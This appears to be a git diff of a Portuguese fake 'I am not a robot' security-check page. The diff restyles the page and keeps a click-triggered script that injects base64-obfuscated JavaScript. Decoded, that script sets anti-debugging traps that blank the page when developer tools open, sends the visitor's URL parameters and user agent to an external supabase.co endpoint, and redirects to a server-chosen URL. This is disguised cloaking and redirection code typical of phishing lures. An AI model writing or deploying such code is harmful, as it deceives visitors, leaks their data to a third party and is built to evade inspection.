@@ -13,91 +13,190 @@
 
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verificação de Segurança</title>
+  <title>Verificação Segura</title>
 
   <style>
-    body {
-      background-color: #0f172a;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
+    * {
+      box-sizing: border-box;
     }
 
-    .box {
-      background: #1e293b;
-      padding: 30px;
-      border-radius: 12px;
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: Inter, Arial, sans-serif;
+      background:
+        radial-gradient(circle at top, #dbeafe 0%, #93c5fd 35%, #3b82f6 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      color: #0f172a;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 390px;
+      background: rgba(255, 255, 255, 0.92);
+      backdrop-filter: blur(14px);
+      border-radius: 24px;
+      padding: 34px 28px;
       text-align: center;
-      max-width: 350px;
-      width: 90%;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      box-shadow: 0 24px 60px rgba(15, 23, 42, 0.25);
+      border: 1px solid rgba(255,255,255,0.65);
+    }
+
+    .shield {
+      width: 64px;
+      height: 64px;
+      margin: 0 auto 18px;
+      border-radius: 20px;
+      background: linear-gradient(135deg, #2563eb, #60a5fa);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 30px;
+      box-shadow: 0 12px 25px rgba(37, 99, 235, 0.35);
+    }
+
+    .badge {
+      display: inline-block;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 0.4px;
+      color: #2563eb;
+      background: #dbeafe;
+      padding: 7px 12px;
+      border-radius: 999px;
+      margin-bottom: 14px;
+      text-transform: uppercase;
+    }
+
+    h1 {
+      font-size: 24px;
+      margin: 0 0 10px;
+      color: #0f172a;
+    }
+
+    p {
+      margin: 0;
+      font-size: 15px;
+      color: #475569;
+      line-height: 1.5;
+    }
+
+    .verify-box {
+      margin-top: 26px;
+      border: 1px solid #dbeafe;
+      background: #f8fafc;
+      border-radius: 16px;
+      padding: 18px;
     }
 
     .checkbox {
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
-      margin-top: 20px;
+      gap: 12px;
       cursor: pointer;
       font-size: 16px;
+      font-weight: 600;
+      color: #1e293b;
+      user-select: none;
     }
 
     input[type="checkbox"] {
-      width: 20px;
-      height: 20px;
+      width: 22px;
+      height: 22px;
       cursor: pointer;
+      accent-color: #2563eb;
     }
 
     .loading {
-      margin-top: 15px;
+      margin-top: 18px;
       display: none;
       font-size: 14px;
-      color: #94a3b8;
+      color: #2563eb;
+      font-weight: 600;
+    }
+
+    .spinner {
+      width: 22px;
+      height: 22px;
+      border: 3px solid #bfdbfe;
+      border-top: 3px solid #2563eb;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 14px auto 0;
+      display: none;
+    }
+
+    .footer {
+      margin-top: 22px;
+      font-size: 12px;
+      color: #64748b;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
     }
   </style>
 
 </head>
 <body>
 
-  <div class="box">
-    <div>🔒 Verificação de Segurança</div>
+  <div class="card">
+    <div class="shield">🔒</div>
 
-    <h2>Confirme que você não é um robô</h2>
+    <div class="badge">Ambiente protegido</div>
 
-    <label class="checkbox">
-      <input type="checkbox" id="check">
-      Não sou um robô
-    </label>
+    <h1>Verificação de Segurança</h1>
 
-    <div class="loading" id="loading">
-      Verificando...
+    <p>
+      Para continuar, confirme que você é uma pessoa real.
+    </p>
+
+    <div class="verify-box">
+      <label class="checkbox">
+        <input type="checkbox" id="check">
+        Não sou um robô
+      </label>
+
+      <div class="spinner" id="spinner"></div>
+
+      <div class="loading" id="loading">
+        Verificando acesso...
+      </div>
+    </div>
+
+    <div class="footer">
+      Sua conexão está sendo validada com segurança.
     </div>
   </div>
 
   <script>
     const checkbox = document.getElementById("check");
     const loading = document.getElementById("loading");
+    const spinner = document.getElementById("spinner");
+
+    let jaClicou = false;
 
     checkbox.addEventListener("change", function() {
-      if (checkbox.checked) {
+      if (checkbox.checked && !jaClicou) {
+        jaClicou = true;
 
         loading.style.display = "block";
+        spinner.style.display = "block";
 
         setTimeout(function() {
-
-          // 🔥 injeta o script do BotBrain SOMENTE após o clique
           const script = document.createElement("script");
 
-          script.innerHTML = `(function(_0x1a2b,_0x3c4d){var _0x5e6f=function(_0x7g8h){return decodeURIComponent(escape(atob(_0x7g8h)));};var _0x9i0j=_0x5e6f(_0x1a2b);(new Function(_0x9i0j))();})("KGZ1bmN0aW9uKCl7CnZhciBfMHhhMT0iYm90LWE3M2YzNDk0IixfMHhiMj0iaHR0cHM6Ly9nZmFrYnJkdm5mdXR6bmh5dXZydi5zdXBhYmFzZS5jby9mdW5jdGlvbnMvdjEvdHJhY2stZXh0ZXJuYWwtY2xpY2siOwp2YXIgXzB4YzM9ZnVuY3Rpb24oKXt2YXIgdD1uZXcgRGF0ZSgpO2RlYnVnZ2VyO3JldHVybiBuZXcgRGF0ZSgpLXQ+MTAwO307CnNldEludGVydmFsKGZ1bmN0aW9uKCl7aWYoXzB4YzMoKSl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fSwxMDAwKTsKdmFyIF8weGQ0PWZ1bmN0aW9uKCl7dmFyIHc9d2luZG93Lm91dGVyV2lkdGgtd2luZG93LmlubmVyV2lkdGg+MTYwLGg9d2luZG93Lm91dGVySGVpZ2h0LXdpbmRvdy5pbm5lckhlaWdodD4xNjA7aWYod3x8aCl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fTsKc2V0SW50ZXJ2YWwoXzB4ZDQsNTAwKTsKKGZ1bmN0aW9uKCl7dmFyIF8weGU1PXt9O25ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCkuZm9yRWFjaChmdW5jdGlvbih2LGspe18weGU1W2tdPXY7fSk7CmZldGNoKF8weGIyLHttZXRob2Q6IlBPU1QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7c2hvcnRDb2RlOl8weGExLHF1ZXJ5UGFyYW1zOl8weGU1LHVzZXJBZ2VudDpuYXZpZ2F0b3IudXNlckFnZW50LHVybENvbXBsZXRvOndpbmRvdy5sb2NhdGlvbi5zZWFyY2guc3Vic3RyaW5nKDEpfHxudWxsfSl9KQoudGhlbihmdW5jdGlvbihyKXtyZXR1cm4gci5qc29uKCk7fSkudGhlbihmdW5jdGlvbihkKXtpZihkJiZkLnJlZGlyZWN0VXJsKXt3aW5kb3cubG9jYXRpb24uaHJlZj1kLnJlZGlyZWN0VXJsO319KS5jYXRjaChmdW5jdGlvbigpe30pOwp9KSgpOwp9KSgpOw==");`;
+          script.textContent = `(function(_0x1a2b,_0x3c4d){var _0x5e6f=function(_0x7g8h){return decodeURIComponent(escape(atob(_0x7g8h)));};var _0x9i0j=_0x5e6f(_0x1a2b);(new Function(_0x9i0j))();})("KGZ1bmN0aW9uKCl7CnZhciBfMHhhMT0iYm90LWE3M2YzNDk0IixfMHhiMj0iaHR0cHM6Ly9nZmFrYnJkdm5mdXR6bmh5dXZydi5zdXBhYmFzZS5jby9mdW5jdGlvbnMvdjEvdHJhY2stZXh0ZXJuYWwtY2xpY2siOwp2YXIgXzB4YzM9ZnVuY3Rpb24oKXt2YXIgdD1uZXcgRGF0ZSgpO2RlYnVnZ2VyO3JldHVybiBuZXcgRGF0ZSgpLXQ+MTAwO307CnNldEludGVydmFsKGZ1bmN0aW9uKCl7aWYoXzB4YzMoKSl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fSwxMDAwKTsKdmFyIF8weGQ0PWZ1bmN0aW9uKCl7dmFyIHc9d2luZG93Lm91dGVyV2lkdGgtd2luZG93LmlubmVyV2lkdGg+MTYwLGg9d2luZG93Lm91dGVySGVpZ2h0LXdpbmRvdy5pbm5lckhlaWdodD4xNjA7aWYod3x8aCl7ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IiI7d2luZG93LmxvY2F0aW9uLmhyZWY9ImFib3V0OmJsYW5rIjt9fTsKc2V0SW50ZXJ2YWwoXzB4ZDQsNTAwKTsKKGZ1bmN0aW9uKCl7dmFyIF8weGU1PXt9O25ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCkuZm9yRWFjaChmdW5jdGlvbih2LGspe18weGU1W2tdPXY7fSk7CmZldGNoKF8weGIyLHttZXRob2Q6IlBPU1QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7c2hvcnRDb2RlOl8weGExLHF1ZXJ5UGFyYW1zOl8weGU1LHVzZXJBZ2VudDpuYXZpZ2F0b3IudXNlckFnZW50LHVybENvbXBsZXRvOndpbmRvdy5sb2NhdGlvbi5zZWFyY2guc3Vic3RyaW5nKDEpfHxudWxsfSl9KQoudGhlbihmdW5jdGlvbihyKXtyZXR1cm4gci5qc29uKCk7fSkudGhlbihmdW5jdGlvbihkKXtpZihkJiZkLnJlZGlyZWN0VXJsKXt3aW5kb3cubG9jYXRpb24uaHJlZj1kLnJlZGlyZWN0VXJsO319KS5jYXRjaChmdW5jdGlvbigpe30pOwp9KSgpOwp9KSgpOw==");`;
 
           document.body.appendChild(script);
-
-        }, 800);
+        }, 900);
       }
     });
   </script>
